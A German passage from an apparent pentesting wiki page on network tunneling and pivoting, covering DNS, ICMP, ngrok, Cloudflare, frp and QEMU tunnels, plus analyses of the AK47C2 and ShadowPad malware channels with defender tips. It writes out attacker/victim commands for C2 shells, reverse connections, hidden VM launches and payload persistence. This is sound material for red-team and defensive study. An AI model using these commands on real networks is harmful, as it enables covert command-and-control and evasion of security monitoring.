[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) ist ein weiterer RDP-Virtual-Channel-Tunnel; der standardmäßige Kanalname lautet `rdp2tcp`, ein Operator kann jedoch einen anderen Namen auswählen.<sup>[[56]](#references)</sup> Die Erstellung und Schließung von Channels wird in `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` mit den Event-IDs **132** und **148** protokolliert. Suche nach `rdp2tcp` und seltenen/zufälligen Kanalnamen und vergleiche sie anschließend mit erwarteten Channels wie `XPSRD`, `cliprdr` und `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Windows-GUI-Apps proxifizieren

Mit [**Proxifier**](https://www.proxifier.com/) kannst du Windows-GUI-Apps so konfigurieren, dass sie über einen Proxy navigieren.<sup>[[26]](#references)</sup>\
Füge unter **Profile -> Proxy Servers** die IP und den Port des SOCKS-Servers hinzu.\
Füge unter **Profile -> Proxification Rules** den Namen des zu proxifizierenden Programms und die Verbindungen zu den IPs hinzu, die du proxifizieren möchtest; Proxifier-Regeln können Anwendungen, Zielhosts und Ports abgleichen.<sup>[[27]](#references)</sup>

## Tunnel durch einen NTLM-Proxy

Das zuvor erwähnte Tool **Rpivot** kann den Traffic über einen Proxy weiterleiten, der NTLM-Authentifizierung erfordert. **OpenVPN** kann ebenfalls über einen solchen Proxy routen, wenn es mit einer Auth-Datei und der NTLMv2-Methode konfiguriert ist; dies ist eine Proxy-Durchquerung und keine Umgehung der Proxy-Authentifizierung.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm authentifiziert sich bei vorgeschalteten NTLM-Proxys, stellt lokale Listener bereit und kann einen lokalen Tunnel-Port einem Zieldienst zuordnen; Clients können dann diesen lokalen Port verwenden.<sup>[[29]](#references)</sup>\
Zum Beispiel diesen Port 443 weiterleiten

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Wenn du jetzt zum Beispiel auf dem Opfer den **SSH**-Dienst so einstellst, dass er auf Port 443 lauscht, kannst du dich über den Angreifer-Port 2222 damit verbinden.<sup>[[29]](#references)</sup>\
Du könntest auch einen **meterpreter** verwenden, der sich mit localhost:443 verbindet, während der Angreifer auf Port 2222 lauscht.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) ist Microsofts .NET-Reverse-Proxy-Toolkit. Du findest es hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine erstellt einen IPv4-Tunnel über DNS-Abfragen und verwendet TUN-Schnittstellen; für die dokumentierte Einrichtung sind auf beiden Seiten die Berechtigungen erforderlich, mit denen diese Schnittstellen erstellt werden können.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

Der DNS-Transport verursacht einen höheren Overhead als direktes TCP und ist normalerweise langsam; du kannst über diesen Tunnel eine komprimierte SSH-Verbindung erstellen, indem du Folgendes verwendest:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Hier herunterladen**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 richtet einen verschlüsselten Command-and-Control-Kanal über DNS ein; die Server- und Client-Befehle unten entsprechen der dokumentierten Verwendung.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **In PowerShell**

Mit [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kannst du einen dnscat2-Client in PowerShell ausführen; die README dokumentiert die unten gezeigten `Start-Dnscat2`-Parameter.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding mit dnscat**

Der interaktive Befehl `listen` von Dnscat2 ordnet einen lokalen Listener einem Remote-Host und -Port zu.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Proxychains-DNS ändern

Proxychains-ng klinkt sich in dynamisch gelinkte TCP-Verbindungen ein und kann weder UDP noch ICMP übertragen; DNS-Proxying ist konfigurierbar. Prüfe daher die installierte `proxychains.conf` und den Resolver-Helper, statt einen festen öffentlichen Resolver anzunehmen. Ältere `proxyresolv`-Skripte bieten `PROXY_DNS_SERVER` zur Auswahl des Resolvers. Verwende einen Resolver, der vom Pivot aus erreichbar ist, wenn interne Namen benötigt werden.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Benutzerdefiniertes DNS TXT / HTTP JSON C2 (AK47C2)

Der Storm-2603-Akteur erstellte ein **Dual-Channel-C2 („AK47C2“)**, das ausschließlich ausgehenden **DNS**- und **einfachen HTTP-POST**-Datenverkehr missbraucht – zwei Protokolle, die in Unternehmensnetzwerken selten blockiert werden.<sup>[[2]](#references)</sup>

1. **DNS-Modus (AK47DNS)**
   • Erzeugt eine zufällige 5-stellige SessionID (z. B. `H4T14`).  
   • Stellt `1` für *Aufgabenanfragen* oder `2` für *Ergebnisse* voran und verkettet verschiedene Felder (Flags, SessionID, Computername).  
   • Jedes Feld wird mit dem ASCII-Schlüssel `VHBD@H` **XOR-verschlüsselt**, hexadezimal kodiert und mit Punkten verbunden – am Ende folgt die vom Angreifer kontrollierte Domain:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Requests verwenden `DnsQuery()` für **TXT**- (und als Fallback **MG**-)Records.  
   • Wenn die Antwort 0xFF Bytes überschreitet, **fragmentiert** die Backdoor die Daten in 63-Byte-Stücke und fügt die Marker ein:
     `s<SessionID>t<TOTAL>p<POS>`, damit der C2-Server sie neu anordnen kann.

2. **HTTP mode (AK47HTTP)**
   • Erstellt einen JSON-Umschlag:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Der gesamte Blob wird mit XOR-`VHBD@H` verarbeitet → in Hex umgewandelt → als Body eines **`POST /`** mit dem Header `Content-Type: text/plain` gesendet.
   • Die Antwort verwendet dieselbe Kodierung, und das Feld `cmd` wird mit `cmd.exe /c <command> 2>&1` ausgeführt.

Blue Team-Hinweise
• Achte auf ungewöhnliche **TXT-Abfragen**, deren erstes Label aus einer langen Hexadezimalfolge besteht und die immer mit derselben seltenen Domain enden.  
• Ein konstanter XOR-Schlüssel, gefolgt von ASCII-Hex, lässt sich mit YARA leicht erkennen: `6?56484244?484` (`VHBD@H` in Hex).  
• Markiere bei HTTP `text/plain`-POST-Bodies, die ausschließlich aus Hex bestehen und eine gerade Anzahl an Bytes haben.

{{#note}}
Der Kanal hält jedes Subdomain-Label innerhalb des DNS-Limits von 63 Oktetten, aber die Einhaltung des Protokolls allein macht ihn nicht unauffällig; seltene Domains, lange Hexadezimal-Labels und das Abfragevolumen sind weiterhin Erkennungssignale.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans dokumentiert einen IPv4-over-ICMP-Tunnel, der ein TUN-Gerät und ICMP-Echo-Requests verwendet; die Einrichtung erfordert ausreichende Berechtigungen zum Erstellen der Schnittstelle.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Hier herunterladen**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng überträgt TCP-Verbindungen über ICMP und verwendet die unten gezeigten Optionen `-p`, `-l`, `-r` und `-R` für den Proxy, den lokalen Listener, den Zielhost und den Zielport.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) ist ein Agent, mit dem lokale Netzwerkdienste über einen sicheren Tunnel online bereitgestellt werden können. Die CLI dokumentiert HTTP-, TCP- und File-URL-Endpunkte. Der ausgegebene Hostname des Endpunkts kann je nach Endpunkt und Konto variieren.<sup>[[39]](#references)</sup>

### Installation

- Konto erstellen: https://ngrok.com/signup
- Client herunterladen:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Grundlegende Verwendung

**Dokumentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Der Agent unterstützt bei Bedarf auch Authentifizierungs- und TLS-Optionen.<sup>[[39]](#references)</sup>_

#### TCP-Tunneling

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Dateien über HTTP bereitstellen

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing von HTTP-Aufrufen

_Nützlich für XSS,SSRF,SSTI ..._\
Der Standalone-Agent stellt seine HTTP-Inspektionsschnittstelle standardmäßig unter `http://127.0.0.1:4040` bereit; die Schnittstelle ist für HTTP-Datenverkehr gedacht.<sup>[[40]](#references)</sup>

#### Tunneling eines internen HTTP-Dienstes

Die Option `--host-header=rewrite` schreibt den HTTP-`Host`-Header der Upstream-Anfrage so um, dass er zum lokalen Dienst passt.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Einfaches Konfigurationsbeispiel für ngrok.yaml

Dies verwendet ngrok Agent Config v2; benannte Tunnels verwenden `proto` und `addr` und werden mit `ngrok start` gestartet.<sup>[[42]](#references)</sup> Es öffnet 3 Tunnels:

- 2 TCP
- 1 HTTP mit Bereitstellung statischer Dateien aus /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels können einen lokalen TCP-basierten Dienst über die Relay-Infrastruktur von Microsoft veröffentlichen. Die Host-CLI erstellt einen ausgehenden Tunnel, während `devtunnel connect` den gehosteten Port auf dem Client wiederherstellt. Standardmäßig ist für Tunnel eine Authentifizierung erforderlich, sofern die Zugriffskontrollen nicht bewusst gelockert werden.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Dies kann RDP über `*.devtunnels.ms` verfügbar machen, ohne einen neuen eingehenden Listener am Perimeter zu öffnen. Es kann auch mit einem RDP-Virtual-Channel-Tunnel wie `rdp2tcp` kombiniert werden, wodurch die RDP-Sitzung zu einem Pivot für beliebigen TCP-Verkehr in einer zweiten Stufe wird.<sup>[[58]](#references)</sup>

Bei der Suche sollten die Ausführung der Dev Tunnels CLI mit DNS-/TLS-Verkehr zu `*.devtunnels.ms` und unerwarteten RDP-Virtual-Channel-Ereignissen korreliert werden. Ein authentifizierter Tunnel ist nicht allein deshalb harmlos, weil er ein Relay von Microsoft nutzt.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Der `cloudflared`-Connector von Cloudflare Tunnel baut ausgehende Verbindungen auf; veröffentlichte Anwendungen können HTTP, HTTPS, TCP, SSH und RDP weiterleiten, während Quick Tunnels für die HTTP-Entwicklung vorgesehen sind.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick-Tunnel-One-Liner

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5-Ursprung (Legacy-Modus)

Das Legacy-Flag `--socks5` teilt `cloudflared` mit, dass der lokale Origin SOCKS5 verwendet; es erstellt keinen lokalen SOCKS5-Listener. Bei einem verwalteten Tunnel konfiguriert `originRequest.proxyType: socks` die SOCKS5-Origin-Verarbeitung.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Persistente Tunnel mit DNS

Lokal verwaltete Tunnel-Konfigurationen verwenden die unten gezeigten Schlüssel `tunnel`, `credentials-file` und `url` in Kleinbuchstaben.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Starte den Connector:

```bash
cloudflared tunnel run mytunnel
```

Der Connector stellt ausgehende Verbindungen her und handelt standardmäßig QUIC mit Fallback auf HTTP/2 aus; gehe nicht davon aus, dass jede Bereitstellung TCP/443 verwendet. Betreibe ihn nur mit den Berechtigungen, die für deine Bereitstellung erforderlich sind.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ist ein Go-Reverse-Proxy, der **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX und XTCP** unterstützt. XTCP verwendet P2P Hole Punching, dessen Erfolg von NAT abhängt. Ab **v0.53.0** kann es als **SSH Tunnel Gateway** fungieren, sodass ein Zielhost den unveränderten OpenSSH-Client ohne `frpc`-Binary verwenden kann.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klassischer Reverse-TCP-Tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Verwendung des neuen SSH-Gateways (keine frpc-Binärdatei)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Der obige Befehl veröffentlicht den Port **8080** des Opfers als **attacker_ip:9000**. Dabei wird der standardmäßige OpenSSH-Client verwendet, während `frps` als Gateway dient.<sup>[[50]](#references)</sup>

## STUN-unterstützte UDP-Back-connects

STUN-Binding-Requests, die von einem UDP-Socket gesendet werden, können dessen serverreflexive IP-Adresse und Port offenlegen, während regelmäßiger Traffic die NAT-Bindung aktiv hält. Ein öffentlicher STUN-Server ist kein Relay für beliebige Steuerpakete.<sup>[[60]](#references)</sup> Bei einem analysierten Back-connect-Design wurde derselbe UDP-Socket für ein kurzes Steuerdatagramm beibehalten. Nach Eingang des Triggers wurde dann eine *separate ausgehende TCP-Verbindung* verwendet, um Befehle abzurufen und auszuführen.<sup>[[59]](#references)</sup>

Damit ein Design das UDP-Paket des Controllers empfangen kann, muss es die Zuordnung weiterhin mit diesem Controller teilen und die Filterrichtlinie des NAT erfüllen. Eine adress- oder portabhängige Filterung akzeptiert möglicherweise Antworten vom STUN-Server, verwirft aber Pakete von einem anderen Endpunkt.<sup>[[60]](#references)[[61]](#references)</sup> Der Rendezvous-Pfad der analysierten Backdoor wurde nicht verifiziert. Daher beweisen erfolgreiche STUN-Antworten allein nicht, dass ihr Steuerkanal erreichbar ist.<sup>[[59]](#references)</sup> Ein separates Protokoll mit explizitem Rendezvous und Relay-Fallback finden Sie unter [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Verdeckte VM-basierte Tunnel mit QEMU

QEMU-Netzwerkbetrieb im User-Modus erfordert für das virtuelle Netzwerk keine Root- oder Administratorrechte. Mit `-netdev user,hostfwd=...` werden TCP-, UDP- oder UNIX-Verbindungen vom Host an den Gast weitergeleitet.<sup>[[51]](#references)</sup> TrustedSec dokumentierte eine Tiny-Core-QEMU-VM und einen versuchten umgekehrten SSH-Tunnel in einem Vorfall, bei dem auf den Host fokussierte EDR-Aktivitäten innerhalb des Gasts möglicherweise nicht erkennen konnte.<sup>[[1]](#references)</sup>

### Kurzer Einzeiler

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Der obige Befehl startet eine **Tiny Core Linux**-VM mit 256 MiB Arbeitsspeicher und einem qcow2-Disk-Image; das Disk-Image liegt nicht im RAM.
• Port **2222/tcp** auf dem Windows-Host wird transparent an **22/tcp** innerhalb der VM weitergeleitet.  
• Aus Sicht des Angreifers ist auf dem Ziel lediglich Port 2222 offen; alle dort eintreffenden Pakete werden vom SSH-Server in der VM verarbeitet.

### Unauffälliger Start über VBScript

TrustedSec beobachtete von VBS gesteuerte QEMU-Starts und Tiny Core-Images in dem oben genannten Vorfall.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Das Ausführen des Skripts mit `cscript.exe //B update.vbs` hält das Fenster verborgen.<sup>[[1]](#references)</sup>

### Persistence im Guest

Der zitierte Vorfall beschreibt Persistence im zustandslosen Tiny-Core-Gast über `/opt/bootlocal.sh` und `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Payload nach `/opt/123.out` ablegen  
2. An `/opt/bootlocal.sh` anhängen:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Füge `home/tc` und `opt` zu `/opt/filetool.lst` hinzu, damit das Payload beim Herunterfahren in `mydata.tgz` gepackt wird.

### Telemetrieaspekte

• Der Host macht weiterhin den QEMU-Prozess, das qcow2-Image und alle vom Host weitergeleiteten Listener sichtbar.  
• Prozessscans, die nur den Host untersuchen, erfassen möglicherweise keine Guest-Prozesse. Virtualisierung garantiert jedoch keine Umgehung; Netzwerk-, QEMU- und Image-Telemetrie können es weiterhin aufdecken.<sup>[[1]](#references)[[51]](#references)</sup>

### Tipps für Defender

• Erstelle einen Alarm für **unerwartete QEMU/VirtualBox/KVM-Binärdateien** in benutzerschreibbaren Pfaden.  
• Blockiere ausgehende Verbindungen, die von `qemu-system*.exe` ausgehen.  
• Suche nach seltenen Listening-Ports (2222, 10022, …), die unmittelbar nach dem Start von QEMU gebunden werden.

## IIS/HTTP.sys-Relay-Knoten via `HttpAddUrl` (ShadowPad)

Check Point beschreibt das IIS-Modul von ShadowPad so, dass es kompromittierte Perimeter-Webserver durch das Binden von URL-Präfixen über `HttpAddUrl` in Backdoor- und Relay-Knoten verwandelt.<sup>[[3]](#references)</sup>

Derselbe Bericht beschreibt die unten zusammengefassten Standardwerte, Wildcard-Listener, Paketentschlüsselung, Relay-Warteschlangen und Debug-Telemetrie.<sup>[[3]](#references)</sup>

* **Standardwerte der Konfiguration** – Wenn in der JSON-Konfiguration des Moduls Werte fehlen, verwendet es plausible IIS-Standardwerte (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). So beantwortet IIS legitimen Traffic mit dem passenden Branding.
* **Wildcard-Abfangen** – Operatoren geben eine durch Semikolons getrennte Liste von URL-Präfixen an (Wildcards in Host und Pfad). Das Modul ruft für jeden Eintrag `HttpAddUrl` auf, sodass HTTP.sys passende Anfragen an den bösartigen Handler weiterleitet; nicht passende Anfragen werden wie gewohnt von IIS verarbeitet.
* **Verschlüsseltes erstes Paket** – Die ersten beiden Bytes des Request-Bodys enthalten den Seed für einen eigenen 32-Bit-PRNG. Jedes nachfolgende Byte wird vor dem Parsen des Protokolls mit dem generierten Keystream XOR-verknüpft:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay-Orchestrierung** – das Modul verwaltet zwei Listen: „servers“ (Upstream-Knoten) und „clients“ (Downstream-Implants). Einträge werden entfernt, wenn innerhalb von etwa 30 Sekunden kein Heartbeat eintrifft. Sind beide Listen nicht leer, verbindet es den ersten verfügbaren Server mit dem ersten verfügbaren Client und leitet einfach Bytes zwischen ihren Sockets weiter, bis eine Seite die Verbindung schließt.
* **Debug-Telemetrie** – optionale Protokollierung erfasst für jede Verbindung die Quell-IP, die Ziel-IP und die insgesamt weitergeleitete Bytezahl. Ermittler nutzten diese Spuren, um das ShadowPad-Mesh über mehrere Opfer hinweg zu rekonstruieren.

---

## Weitere Tools zum Prüfen

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Im Schatten verborgen: Verdeckte Tunnel via QEMU-Virtualisierung](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Vor ToolShell: Einblicke in die früheren Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Einblicke in Ink Dragon: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap-Referenzhandbuch: Beschränkungen durch Firewall/IDS umgehen](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD-Handbuch zu ssh](https://man.openbsd.org/ssh)
- [7] [OpenBSD-Handbuch zu sshd_config](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 – Versionshinweise](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit-Dokumentation zum socks_proxy-Modul](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit-Dokumentation zum autoroute-Modul](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS-Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse-Port-Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng-Schnellstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng-Listener](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng-Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat-Handbuch](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY-Plink-Handbuch](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY-Befehlszeilenoptionen](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft-Befehl netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier-Dokumentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier-Proxyfizierungsregeln](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN-2.7-Handbuch](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domainnamen – Implementierung und Spezifikation](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok-Agent-CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok-Webinspektionsoberfläche](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok-Virtual-Hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok-Agent-Konfiguration v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Überblick über Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Ursprungsparameter von Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Einrichtung von Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Konfigurationsdatei von Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Ausführungsparameter von Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp-Konzepte](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH-Tunnel-Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU-Netzwerkdokumentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI-BOFScale-Quellcode-Repository](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Ein CDN-gestütztes Tailnet von einem BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn – Dev-Tunnels-CLI-Befehle](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket – atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer und Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs – ClingSTUN-Linux-Backdoor missbraucht öffentliche STUN-Infrastruktur](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 – Session Traversal Utilities for NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 – Anforderungen an das NAT-Verhalten für Unicast-UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
{{#include ../banners/hacktricks-training.md}}
